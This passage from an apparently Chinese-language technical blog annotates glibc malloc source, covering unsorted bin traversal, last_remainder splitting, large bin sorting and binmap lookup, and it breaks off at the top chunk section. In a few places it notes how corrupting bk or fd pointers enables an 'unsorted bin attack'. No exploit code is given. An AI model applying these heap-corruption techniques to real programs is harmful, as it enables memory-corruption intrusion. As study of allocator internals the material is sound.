c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">//如果申请的大小在 smallbin 的范围中，且 unsortedbin 链表中只有一个 chunk 并指向 last_remainder，且该 chunk 的 size 大小大于用户申请的 size 大小</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>      &#123;<br>        <span class="hljs-comment">/* split and reattach remainder */</span><br>        <span class="hljs-comment">//拆分 chunk，更新last_remainder 的大小和开始地址</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (victim, nb);<br>        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>        <span class="hljs-comment">//切割出剩下的 chunk 作为新的 av-&gt;last_remainder</span><br>        av-&gt;last_remainder = remainder;<br>        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>        <span class="hljs-comment">// 如果 remainder_size 的大小不属于 smallbin，则需要设置 nextsize 为空，后面会把它丢到 unsortedbin 中</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>          &#123;<br>            remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>            remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>          &#125;<br><span class="hljs-comment">//下面就是设置各种标志位了</span><br>        set_head (victim, nb | PREV_INUSE |<br>                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head (remainder, remainder_size | PREV_INUSE);<br>        set_foot (remainder, remainder_size);<br><br>        check_malloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br></code></pre></td></tr></table></figure><p>这段代码最开始的判断详细拆分一下就是：</p><ul><li><code>in_smallbin_range (nb)</code> ：申请的大小在 small bin 的范围中</li><li><code>bck == unsorted_chunks (av)</code> ：unsorted bin 中只有一个 chunk 。</li><li><code>victim == av-&gt;last_remainder</code>：这个 chunk 刚好是最近被分割过的剩余部分。</li><li><code>(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</code>：找到的这个 chunk的 <code>size</code> 大于需要的最小块大小+ <code>MINSIZE</code> 。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-comment">//如果上一个条件满足就是 chunk 要被分配出去了所以要把这个 chunk 从 unsortedbin 中解除</span><br><span class="hljs-comment">//因为这个指令在 if 外所以不满足也会拿出最后一个 chunk</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>前一个 if 条件不满足就到这里了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><span class="hljs-comment">//如果当前用户申请的size刚好与解链的chunk大小相同，则返回</span><br>      <span class="hljs-keyword">if</span> (size == nb)<br>        &#123;<br>          set_inuse_bit_at_offset (victim, size);<br>          <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>            victim-&gt;size |= NON_MAIN_ARENA;<br>          check_malloced_chunk (av, victim, nb);<br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br></code></pre></td></tr></table></figure><p>如果取出的这个 chunk 的  <code>size</code> 刚好等于这个 <code>nb</code> ，那就说明这个块一定是最合适的，就直接返回。如果不合适进入下面的部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断取出的这个 chunk 的 size 属不属于 smallbin</span><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>        &#123;<br>          <span class="hljs-comment">//将该chunk插入small bin中</span><br>          victim_index = smallbin_index (size);<br>          bck = bin_at (av, victim_index);<br>          fwd = bck-&gt;fd;<br>        &#125;<br> <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">//不是的话插入 largebin</span><br>          victim_index = largebin_index (size);<br>          bck = bin_at (av, victim_index);<br>          fwd = bck-&gt;fd;<br></code></pre></td></tr></table></figure><p>属于 smallbin 就丢进 smallbin，如果不属于就丢进 largebin 了。</p><p>这部分代码最开始开始的判断大小然后丢进 largebin、smallbin 的部分，就是我们前面说分配规则的时候提到的把 unsortedbin 中的堆块分类的实现。</p><p>我们丢进large bin 之后要设置相应的指针。large bin 中一个 <code>chunk </code> 有四个指针，每对链表头 bin 都管理一个二维双向链表，<code>fd</code>、<code>bk</code> 指针与相同大小的 chunk 连接，<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 与不同大小的 <code>chunk</code> 连接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C">   <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>         <span class="hljs-comment">//这里的 bck 指的是表头 bin 所在的 chunk，fwd 指的是最大的 chunk。</span><br><span class="hljs-comment">//检测 largebin 是否非空</span><br>         <span class="hljs-keyword">if</span> (fwd != bck)<br>           &#123;<br>             <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>             <span class="hljs-comment">//去除 P标志位</span><br>             size |= PREV_INUSE;<br>             <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>             <span class="hljs-comment">//检查A标志位</span><br>             assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>             <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>               &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br><br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>               &#125;<br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                   &#123;<br>                     fwd = fwd-&gt;fd_nextsize;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                   &#125;<br><br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                   <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                   fwd = fwd-&gt;fd;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     victim-&gt;fd_nextsize = fwd;<br>                     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                     fwd-&gt;bk_nextsize = victim;<br>                     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                   &#125;<br>                 bck = fwd-&gt;bk;<br>               &#125;<br>           &#125;<br>         <span class="hljs-comment">//如果 largebin 为空，那么直接加入链表就行</span><br>         <span class="hljs-keyword">else</span><br>           victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>       &#125;<br></code></pre></td></tr></table></figure><p>我们向一个空的 largebin 中插入 chunk 的流程大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">fwd=bin-&gt;fd;<br>bck=bin-&gt;bk;<br>victim-&gt;bk_nextsize=bck;<br>victim-&gt;fd_nextsize=fwd;<br>fwd-&gt;bk_nextsize=bck-&gt;fd_nextsize=victim;<br></code></pre></td></tr></table></figure><p>非空也一样，就是把 bin 的指针换成对应的前后 chunk 的指针。</p><p>中间没有注释的长长的一部分都是在查找合适的位置插入，然后修改指针。如果在当前的 largebin 中找到了 <code>size</code> 等于我们取出的 chunk 的堆块 <code>size</code> 的堆块，就只需要修改 <code>fd</code> 和 <code>bk </code>指针；其他情况还需要修改 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针。</p><p>前面找到了插入的位置，接下来就是插入操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>上面对 unsortedbin 的遍历比较长，每一次便利的流程大概流程就是：</p><p>查找 unsortedbin 是否为空。不为空，且只有一个 chunk 且为 last_remainder 时，进行 last_remainder 切分后直接返回；如果有多个 chunk ，则需要将 chunk 从 unsortedbin 中解链，如果大小满足则返回，</p><p>如果chunk大小不满足，进行判断对应丢进 smallbin 或 largebin 。</p><p>注意，<strong>当取得 unsorted bin chunk 与我们申请的 chunk 大小相同时</strong>，程序进行了如下操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-comment">//将当前的chunk从unsortedbin 链表里解除</span><br>unsorted_chunks(av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks(av);<br></code></pre></td></tr></table></figure><p>据此我们可以发现另外一种利用方法，<strong>控制 av 的 bk 指针，那么就能向 bk 的 fd 指针写入 av 的值，发生 unsortedbin attack。</strong></p><p>我们之前不是遍历 unsortedbin 又整理了一下 largebin 和 smallbin 嘛，如果在 unsortebin 里面没找到合适的就会再去查找一遍请求 size 对应的 bin 中的 chunk 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">//确认用户申请的 chunk 大小不属于 smallbin</span><br><span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>     &#123;<br>       bin = bin_at (av, idx);<br><br>       <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>       <span class="hljs-comment">//如果 largebin 不为空，用户请求的 size 小于 large bin 中最大的 chunk size</span><br>       <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>         &#123;<br>           <span class="hljs-comment">//while 循环获取刚好小于用户请求的 size 的 large bin</span><br>           victim = victim-&gt;bk_nextsize;<br>           <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                   (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>             victim = victim-&gt;bk_nextsize;<br><br>           <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">              list does not have to be rerouted.  */</span><br>           <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>             victim = victim-&gt;fd;<br><br>           <span class="hljs-comment">//拆分符合要求的 large chunk</span><br>           remainder_size = size - nb;<br>           <span class="hljs-comment">//将large chunk从 largebin 中解链</span><br>           unlink (av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-comment">//处理切分下来的剩余部分，如果切割下来的部分小于 MINSIZE 那就不切割了</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>             &#123;<br>               <span class="hljs-comment">//把它物理相邻的下一个快prev_inuse位设1</span><br>               set_inuse_bit_at_offset (victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                 victim-&gt;size |= NON_MAIN_ARENA;<br>             &#125;<br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>             &#123;<br>               <span class="hljs-comment">//将切割的剩余部分插入 unsortedbin 中</span><br>               remainder = chunk_at_offset (victim, nb);<br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks (av);<br>               fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                 &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>                 &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br>               <span class="hljs-comment">// remainder 不满足 small bin</span><br>               <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                 &#123;<br>                   <span class="hljs-comment">//清空它的fd_nextsize和bk_nextsize</span><br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                 &#125;<br>               <span class="hljs-comment">// 设置分配的 chunk 堆头</span><br>               set_head (victim, nb | PREV_INUSE |<br>                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head (remainder, remainder_size | PREV_INUSE);<br>               set_foot (remainder, remainder_size);<br>             &#125;<br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br>     &#125;<br></code></pre></td></tr></table></figure><p>在寻找时不是有说要找最小能满足的大小的块嘛，代码中 <code>nb</code> 是指用户需要的最小能满足的块的 <code>size</code> ，实际上并不是所有情况下都满足 <code>size=nb</code> 。例如：我们申请 0x1 大小的堆块，那就只能给它一个 0x20 的 chunk。或者 我们现在甚至没有 0x20 的块，但是有一个 0x30 的，那么这个 0x30 的 chunk 就是我们要寻找的堆块。</p><p>在处理切割下来的堆块时，它只检测了了 <code>unsorted bin-&gt;fd-&gt;bk</code> 是否等于那个 <code>unsorted bin</code> ，对于堆块来说就是只检测了 <code>bk</code> 指针。这是一个利用小技巧，也就是说这时<strong>我们可以修改 <code>fd</code> 指针为期望的值，不会在这里被检测到，就是 <code>unsorted bin attack</code> 了。</strong></p><p>被切割的剩下 chunk 会被放在 <code>unsortedbin</code> ，但是程序仍然会检测它是不是在 <code>small bin</code> 的范围里。如果不在 <code>small bin</code> 范围内，就会清空它的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 。因为它要回到 <code>unsorted bin</code> ，这两个字段就没什么用了，就会被清空。</p><p>如果当前的 large bin 中没有符合要求的 chunk，则在其它 size 的 large bin 中进行查找。首先需要看一下这个  <code>binmap</code> 结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">++idx;<br>   bin = bin_at (av, idx);<br>   block = idx2block (idx);<br>   <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>   bit = idx2bit (idx);<br></code></pre></td></tr></table></figure><p>这个结构用于快速检索一个 <code>bin</code> 是否为空，每一个 <code>bit</code> 表示对应的 <code>bin</code> 中是否存在空闲 chunk 。这一段就是说，如果 <code>large bin</code> 搜索完了都没有找到合适的 <code>chunk</code> ，那么就去下一个 <code>idx</code> 里面寻找。然后一共有4个 <code>int</code> ，每个 <code>int</code> 32位表示一块 <code>map</code> ，一共表示 <code>128</code> 位。</p><p>这段代码的执行流程就是：利用 idx 索引值来获取指向对应 bin 的指针。然后根据这个 bin 指针来获取 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>     &#123;<br>       <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>       <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>         &#123;<br>           <span class="hljs-keyword">do</span><br>             &#123;<br>               <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                 <span class="hljs-keyword">goto</span> use_top;<br>             &#125;<br>           <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>           bit = <span class="hljs-number">1</span>;<br>         &#125;<br></code></pre></td></tr></table></figure><p>两个判断条件：</p><ul><li><code>bit&gt;map</code>：如果这个位的权值都比它整个的 <code>map</code> 都大了，说明 <code>map</code> 上那个 <code>bit</code> 的权值必定为0</li><li><code>bit==0</code>：如果这个 <code>bit</code> 都是 0 说明这个 <code>index</code> 也不对。</li></ul><p>两个条件只要满足其一就是没有空闲堆块，接着去查看下一个 index。</p><p>接下来的判断如果 <code>map==0</code> ，说明这整个 <code>block</code> 都没有空闲块，就直接跳过，不为 0 则退出去执行下面的操作，如果超过了 <code>block</code> 的总数，那就说明 <code>unsorted bin</code> 和 <code>large bin</code> 中也没有合适的<code>chunk</code>，那我们就切割<code>top_chunk</code>了，这里用了一个 <code>goto use_top;</code> 跳转，在后面会分析到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>      <span class="hljs-comment">// 在 block 中找到存在符合要求的 large bin 链表头指针</span><br>      <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<br>        &#123;<br>          bin = next_bin (bin);<br>          bit &lt;&lt;= <span class="hljs-number">1</span>;<br>          assert (bit != <span class="hljs-number">0</span>);<br>        &#125;<br><br>      <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>      victim = last (bin);<br><br>      <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br><span class="hljs-comment">// 如果链表非空</span><br>      <span class="hljs-keyword">if</span> (victim == bin)<br>        &#123;<br>          av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>          bin = next_bin (bin);<br>          bit &lt;&lt;= <span class="hljs-number">1</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>经过上面的流程，我们已经找到了合适的 block ，接下来就是寻找 block 的各个位了。从低位开始，如果检查到<code>map</code>那一位对应为0就找下一位，我们前面提到 bk 为 <code>large bin</code> 的最小块，所以先从它开始，也就是先执行 <code>bin = next_bin (bin);</code> 。</p><p>当然不能说 <code>map</code> 里面说这里有它就有，我还得自己判断一下这个<code>bin</code>里面是不是真的有，如果没有就要及时把标志位清除然后 <code>bit&lt;&lt;1</code> 去寻找下一个 <code>index</code> 。</p><p>找到合适的 <code>large bin</code> 的索引，我们就可以从中找合适的堆块，流程和上面一样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">// 找到第一个大于申请 size 的 chunk 进行堆块划分</span><br>       <span class="hljs-keyword">else</span><br>         &#123;<br>           size = chunksize (victim);<br><br>           <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>           assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>           remainder_size = size - nb;<br><br>           <span class="hljs-comment">/* unlink */</span><br>           unlink (av, victim, bck, fwd);<br><br>           <span class="hljs-comment">/* Exhaust */</span><br>           <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>             &#123;<br>               set_inuse_bit_at_offset (victim, size);<br>               <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                 victim-&gt;size |= NON_MAIN_ARENA;<br>             &#125;<br><br>           <span class="hljs-comment">/* Split */</span><br>           <span class="hljs-keyword">else</span><br>             &#123;<br>               remainder = chunk_at_offset (victim, nb);<br><br>               <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                  have to perform a complete insert here.  */</span><br>               bck = unsorted_chunks (av);<br>               fwd = bck-&gt;fd;<br><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                 &#123;<br>                   errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                   <span class="hljs-keyword">goto</span> errout;<br>                 &#125;<br>               remainder-&gt;bk = bck;<br>               remainder-&gt;fd = fwd;<br>               bck-&gt;fd = remainder;<br>               fwd-&gt;bk = remainder;<br><br>               <span class="hljs-comment">/* advertise as last remainder */</span><br>               <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                 av-&gt;last_remainder = remainder;<br>               <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                 &#123;<br>                   remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                   remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                 &#125;<br>               set_head (victim, nb | PREV_INUSE |<br>                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>               set_head (remainder, remainder_size | PREV_INUSE);<br>               set_foot (remainder, remainder_size);<br>             &#125;<br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         &#125;<br>     &#125;<br></code></pre></td></tr></table></figure><h5 id="Topchunk"><a href="#Topchunk" class="headerlink" title="Topchunk"></a>Topchunk</h5><p>如果在 large bin 中没有找到响应的 chunk，则需要在 top chunk 中查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 